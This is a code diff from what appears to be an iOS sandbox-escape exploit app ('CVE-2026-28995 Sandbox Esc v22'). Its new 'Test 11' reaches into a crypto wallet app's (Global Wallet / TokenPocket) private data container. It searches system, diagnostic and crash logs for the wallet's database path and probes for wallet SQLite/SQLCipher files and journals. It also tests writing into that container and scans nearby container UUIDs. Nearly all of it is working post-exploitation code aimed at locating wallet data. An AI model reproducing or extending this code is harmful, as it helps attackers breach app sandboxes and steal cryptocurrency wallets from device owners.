@@ -663,7 +663,7 @@ static void *e2_free_and_ool_racer(void *arg) {
     UIButtonConfiguration *sbConf = [UIButtonConfiguration filledButtonConfiguration];
     sbConf.baseBackgroundColor = [UIColor systemTealColor];
     self.sandboxEscapeButton.configuration = sbConf;
-    [self.sandboxEscapeButton setTitle:@"CVE-2026-28995 Sandbox Esc v21" forState:UIControlStateNormal];
+    [self.sandboxEscapeButton setTitle:@"CVE-2026-28995 Sandbox Esc v22" forState:UIControlStateNormal];
     [self.sandboxEscapeButton addTarget:self action:@selector(sandboxEscapeTapped) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:self.sandboxEscapeButton];
 
@@ -7376,112 +7376,168 @@ static void *iohid_threadCopyEvent(void *arg) {
         [log appendFormat:@"  ProductBuildVersion: %@\n", sv[@"ProductBuildVersion"]];
     }
 
-        // Test 11: Read TP config files to discover DB path (v21)
-    [log appendString:@"\n--- Test 11: Config file extraction (v21) ---\n"];
+            // Test 11: Crash logs + Write test (v22)
+    [log appendString:@"\n--- Test 11: Crash logs & Write test (v22) ---\n"];
     NSString *tpUUID = @"0D926318-FE07-4B1D-8A4B-5278C4E380D5";
     NSString *tpBase = [NSString stringWithFormat:
         @"var/mobile/Containers/Data/Application/%@", tpUUID];
 
-    // Helper: read file, deserialize plist, dump keys
-    void (^dumpFile)(NSString*, NSString*, NSMutableString*) =
+    // Helper: read file and search for DB-related patterns
+    void (^searchFile)(NSString*, NSString*, NSMutableString*) =
     ^(NSString *path, NSString *label, NSMutableString *out) {
         NSString *p = TRYFILE(path);
         NSData *d = [NSData dataWithContentsOfFile:p];
         if (!d || d.length == 0) {
-            [out appendFormat:@"  [-] %@: %@\n", label, d ? @"empty" : @"not readable"];
+            [out appendFormat:@"  [-] %@: %@\n", label, d ? @"empty" : @"blocked"];
             return;
         }
         [out appendFormat:@"  [+] %@: %llu bytes\n", label, (unsigned long long)d.length];
-        const unsigned char *b = d.bytes;
-        BOOL isBinary = (d.length > 6 && memcmp(b, "bplist", 6) == 0);
-        BOOL isXML = (d.length > 5 && memcmp(b, "<?xml", 5) == 0);
-        BOOL isSQLite = (d.length > 16 && memcmp(b, "SQLite format 3\0", 16) == 0);
-        [out appendFormat:@"      magic: %s%s%s\n",
-            isBinary ? "bplist " : "", isXML ? "xml " : "", isSQLite ? "SQLITE " : ""];
-        if (isBinary || isXML) {
-            NSError *err = nil;
-            id plist = [NSPropertyListSerialization propertyListWithData:d
-                options:NSPropertyListImmutable format:nil error:&err];
-            if (plist) {
-                if ([plist isKindOfClass:[NSDictionary class]]) {
-                    [out appendFormat:@"      dict keys: %@\n",
-                        [[(NSDictionary*)plist allKeys] componentsJoinedByString:@", "]];
-                    for (NSString *k in [(NSDictionary*)plist allKeys]) {
-                        id v = [(NSDictionary*)plist objectForKey:k];
-                        NSString *vStr = [v isKindOfClass:[NSData class]]
-                            ? [NSString stringWithFormat:@"<data %lu bytes>", (unsigned long)[(NSData*)v length]]
-                            : ([v isKindOfClass:[NSString class]] ? (NSString*)v : [v description]);
-                        if (vStr.length > 500) vStr = [[vStr substringToIndex:500] stringByAppendingString:@"..."];
-                        [out appendFormat:@"        [%@] = %@\n", k, vStr];
-                    }
-                } else if ([plist isKindOfClass:[NSArray class]]) {
-                    [out appendFormat:@"      array[%lu]\n", (unsigned long)[(NSArray*)plist count]];
-                } else {
-                    [out appendFormat:@"      plist: %@\n", plist];
-                }
-            } else {
-                [out appendFormat:@"      plist parse err: %@\n", err.localizedDescription];
+        // Search for TP-related patterns
+        NSArray *patterns = @[@"Global Wallet", @"Global_Wallet", @"TokenPocket",
+            @"tokenpocket", @"com.global.wallet.ios", @".db", @".sqlite",
+            @".sqlite3", @"sqlcipher", @"Documents/db", @"Library/Caches",
+            @"WalletDB", @"HDWalletDB", @"KeyPalDB", @"wallet.db",
+            @"SQLite", @"database", @"Database", @"/var/mobile/Containers/"];
+        BOOL found = NO;
+        for (NSString *pat in patterns) {
+            NSData *pd = [pat dataUsingEncoding:NSUTF8StringEncoding];
+            NSRange r = [d rangeOfData:pd options:0 range:NSMakeRange(0, d.length)];
+            if (r.location != NSNotFound) {
+                if (!found) { [out appendString:@"      HITS:\n"]; found = YES; }
+                // Extract context around match
+                NSUInteger ctxStart = r.location > 40 ? r.location - 40 : 0;
+                NSUInteger ctxLen = MIN(pat.length + 80, d.length - ctxStart);
+                NSData *ctx = [d subdataWithRange:NSMakeRange(ctxStart, ctxLen)];
+                NSMutableString *ctxStr = [NSMutableString string];
+                const unsigned char *b = ctx.bytes;
+                for (NSUInteger i = 0; i < ctx.length; i++)
+                    [ctxStr appendFormat:@"%c", (b[i]>=0x20 && b[i]<0x7f) ? b[i] : '.'];
+                [out appendFormat:@"        [%s] @%llu: ...%s...\n",
+                    pat.UTF8String, (unsigned long long)r.location, ctxStr.UTF8String];
             }
         }
-        NSUInteger dumpLen = MIN(256, d.length);
-        NSMutableString *hex = [NSMutableString string];
-        [hex appendString:@"      hex: "];
-        for (NSUInteger i = 0; i < dumpLen; i++) {
-            [hex appendFormat:@"%02x", b[i]];
-            if ((i + 1) % 64 == 0 && i + 1 < dumpLen) [hex appendString:@"\n           "];
-        }
-        [out appendString:hex];
-        [out appendString:@"\n"];
+        if (!found) [out appendString:@"      (no TP/DB patterns found)\n"];
     };
 
-    // === Step 1: TP container config plists ===
-    [log appendString:@"\n[Step 1] TP container config plists:\n"];
-    dumpFile([tpBase stringByAppendingPathComponent:@"Library/Preferences.plist"],
-        @"Prefs.plist (Library root)", log);
-    dumpFile([tpBase stringByAppendingPathComponent:@"Library/Preferences/Preferences.plist"],
-        @"Prefs.plist (in Preferences/)", log);
-    dumpFile([tpBase stringByAppendingPathComponent:@"Library/Preferences/com.global.wallet.ios.plist"],
-        @"bundleID plist (in Prefs)", log);
+    // ===== PART A: Crash & System Logs =====
+    [log appendString:@"\n[Part A] System log & crash log files:\n"];
 
-    // === Step 2: System CFPreferences plists ===
-    [log appendString:@"\n[Step 2] System CFPreferences plists:\n"];
-    dumpFile(@"var/mobile/Library/Preferences/com.global.wallet.ios.plist",
-        @"/var/mobile/Library/Preferences/com.global.wallet.ios.plist", log);
-    dumpFile(@"var/mobile/Library/Preferences/group.com.tpwallet.wc.plist",
-        @"group.com.tpwallet.wc plist", log);
-    dumpFile(@"var/mobile/Library/Preferences/group.com.tp.wallet.wc.plist",
-        @"group.com.tp.wallet.wc plist", log);
-    dumpFile(@"var/mobile/Library/Preferences/Global_Wallet.plist",
-        @"Global_Wallet.plist", log);
-    dumpFile(@"var/mobile/Library/Preferences/tokenpocket.plist",
-        @"tokenpocket.plist", log);
+    // A1: Diagnostic log databases (unified logging)
+    NSArray *diagPaths = @[
+        @"var/db/diagnostics/Persist/.tracev3",
+        @"var/db/diagnostics/Special/.tracev3",
+        @"var/db/diagnostics/timesync/.tracev3",
+        @"var/db/diagnostics/0000000000000000.tracev3",
+        @"var/db/uuidtext/dsc",
+        @"var/db/uuidtext/strings",
+    ];
+    for (NSString *dp in diagPaths) {
+        probeFile(dp, log);
+        searchFile(dp, [dp lastPathComponent], log);
+    }
 
-    // === Step 3: TP Library targeted file probing ===
-    [log appendString:@"\n[Step 3] TP Library targeted probing:\n"];
-    NSArray *v21subdirs = @[@"Library/", @"Library/Preferences/", @"Library/Caches/", @"Documents/db/"];
-    NSArray *v21names = @[@"Preferences", @"Config", @"AppConfig", @"db_config",
-        @"Global_Wallet", @"wallet_data", @"wallet_config",
-        @"com.global.wallet.ios", @"tokenpocket", @"Settings",
-        @"app_config", @"localData", @"AppData", @"db_info", @"KeyPal",
-        @"hdwallet", @"Store", @"wallet", @"appdata", @"keypal_config",
-        @"TPMain", @"TPWallet", @"UserData", @"CacheData", @"Global_Wallet.sqlite",
-        @"Global_Wallet.db", @"Global_Wallet.encrypted", @"Global_Wallet.sqlcipher",
-        @"walletdb", @"WalletDB", @"HDWalletDB", @"KeyPalDB", @"KeyPalWalletDB"];
-    NSArray *v21exts = @[@".plist", @".json", @".data", @".bin", @".xml", @".sqlite",
-        @".db", @".sqlite3", @".encrypted", @".sqlcipher", @".dat", @".cfg", @""];
-    for (NSString *sd in v21subdirs) {
-        for (NSString *nm in v21names) {
-            for (NSString *ex in v21exts) {
-                probeFile([tpBase stringByAppendingPathComponent:
-                    [NSString stringWithFormat:@"%@%@%@", sd, nm, ex]], log);
-            }
+    // A2: CrashReporter paths
+    [log appendString:@"\n  -- CrashReporter --\n"];
+    probeFile(@"var/mobile/Library/Logs/CrashReporter", log);
+    probeFile(@"var/mobile/Library/Logs/CrashReporter/Retired", log);
+    // Try common crash log names for TP
+    NSArray *crashNames = @[
+        @"Global Wallet", @"Global_Wallet", @"GlobalWallet",
+        @"com.global.wallet.ios", @"TokenPocket", @"tokenpocket",
+    ];
+    NSArray *crashSuffixes = @[@".ips", @".crash", @"-2026.ips", @"-2025.ips"];
+    for (NSString *cn in crashNames) {
+        for (NSString *cs in crashSuffixes) {
+            NSString *cp = [NSString stringWithFormat:@"var/mobile/Library/Logs/CrashReporter/%@%@", cn, cs];
+            probeFile(cp, log);
+            searchFile(cp, @"crash", log);
         }
     }
 
-    // === Step 4: Read TP bundle Info.plist ===
-    [log appendString:@"\n[Step 4] TP bundle Info.plist:\n"];
-    dumpFile(@"var/containers/Bundle/Application/97028E76-0192-4651-BF43-3BFCAC8D9BA9/Global Wallet.app/Info.plist",
-        @"TP Info.plist", log);
+    // A3: System log files
+    [log appendString:@"\n  -- System logs --\n"];
+    NSArray *sysLogs = @[
+        @"var/log/system.log",
+        @"var/log/install.log",
+        @"var/log/mobile.log",
+        @"var/log/com.apple.mobile.installation.plist",
+        @"private/var/log/system.log",
+        @"Library/Logs/General.log",
+        @"var/mobile/Library/Logs/MobileInstallation/mobile_installation.log",
+    ];
+    for (NSString *sl in sysLogs) {
+        searchFile(sl, [sl lastPathComponent], log);
+    }
+
+    // A4: DiagnosticMessagesHistory (aggregates crash/panic data)
+    searchFile(@"var/mobile/Library/Logs/CrashReporter/DiagnosticMessagesHistory.plist",
+        @"DiagMessagesHistory", log);
+
+    // A5: Try to read raw dir entry data (APFS directory as file)
+    [log appendString:@"\n  -- Raw dir reads --\n"];
+    // Try reading the directory itself as a file (might return raw entries on APFS)
+    searchFile([tpBase stringByAppendingPathComponent:@"Library"], @"TP Library raw", log);
+    searchFile([tpBase stringByAppendingPathComponent:@"Library/Preferences"], @"TP Prefs raw", log);
+    searchFile([tpBase stringByAppendingPathComponent:@"Library/Caches"], @"TP Caches raw", log);
+    searchFile([tpBase stringByAppendingPathComponent:@"Documents/db"], @"TP db dir raw", log);
+
+    // A6: Journal / WAL in db dir
+    [log appendString:@"\n  -- SQLite journal/WAL in db dir --\n"];
+    for (NSString *jn in @[@"wallet", @"tp", @"data", @"keypal", @"hdwallet",
+        @"Global_Wallet", @"tokenpocket", @"WalletDB", @"KeyPalDB", @"HDWalletDB"]) {
+        for (NSString *je in @[@".db-journal", @".db-wal", @".db-shm",
+            @".sqlite-journal", @".sqlite-wal", @".sqlite-shm",
+            @"-journal", @"-wal", @"-shm", @".journal", @".wal", @".shm"]) {
+            probeFile([tpBase stringByAppendingPathComponent:
+                [NSString stringWithFormat:@"Documents/db/%@%@", jn, je]], log);
+        }
+    }
+
+    // ===== PART B: Write Test =====
+    [log appendString:@"\n[Part B] Write capability test:\n"];
+    NSData *testData = [@"v22_write_test_12345" dataUsingEncoding:NSUTF8StringEncoding];
+    NSArray *writePaths = @[
+        @"var/mobile/Documents/v22_test.txt",                    // /var/mobile/Documents
+        @"var/mobile/tmp/v22_test.txt",                          // /tmp
+        @"tmp/v22_test.txt",                                      // relative /tmp
+        [tpBase stringByAppendingPathComponent:@"Documents/v22_probe.txt"],  // TP Documents
+        [tpBase stringByAppendingPathComponent:@"Library/Caches/v22_probe.txt"], // TP Caches
+        [NSString stringWithFormat:@"var/mobile/Containers/Data/Application/%@/tmp/v22_probe.txt", tpUUID], // TP tmp
+    ];
+    for (NSString *wp in writePaths) {
+        NSString *p = TRYFILE(wp);
+        BOOL ok = [testData writeToFile:p atomically:NO];
+        [log appendFormat:@"  write %@ -> %@\n", ok ? @"OK" : @"FAIL", wp];
+        if (ok) {
+            // Verify by reading back
+            NSString *back = [NSString stringWithContentsOfFile:p encoding:NSUTF8StringEncoding error:nil];
+            [log appendFormat:@"    readback: %@\n", back ?: @"(nil)"];
+            // Clean up
+            [[NSFileManager defaultManager] removeItemAtPath:p error:nil];
+        }
+    }
+
+    // ===== PART C: Alternate data container UUID scan =====
+    [log appendString:@"\n[Part C] Check for alternate TP containers:\n"];
+    // Try a few other UUIDs that might be TP data containers
+    NSArray *altUUIDs = @[
+        @"0D926318-FE07-4B1D-8A4B-5278C4E380D5", // known TP
+        @"1C93DF54-18B3-4C3F-BB93-AF3E406083D0", // nearby hex
+        @"0D926318-FE07-4B1D-8A4B-5278C4E380D4", // -1
+        @"0D926318-FE07-4B1D-8A4B-5278C4E380D6", // +1
+    ];
+    for (NSString *uid in altUUIDs) {
+        NSString *p = [NSString stringWithFormat:
+            @"var/mobile/Containers/Data/Application/%@/.com.apple.mobile_container_manager.metadata.plist", uid];
+        NSString *rp = TRYFILE(p);
+        NSData *md = [NSData dataWithContentsOfFile:rp];
+        if (md && md.length > 0) {
+            NSError *err;
+            id plist = [NSPropertyListSerialization propertyListWithData:md
+                options:NSPropertyListImmutable format:nil error:&err];
+            [log appendFormat:@"  [+] %@: %@\n", uid, plist ?: err.localizedDescription];
+        }
+    }
 
 
 
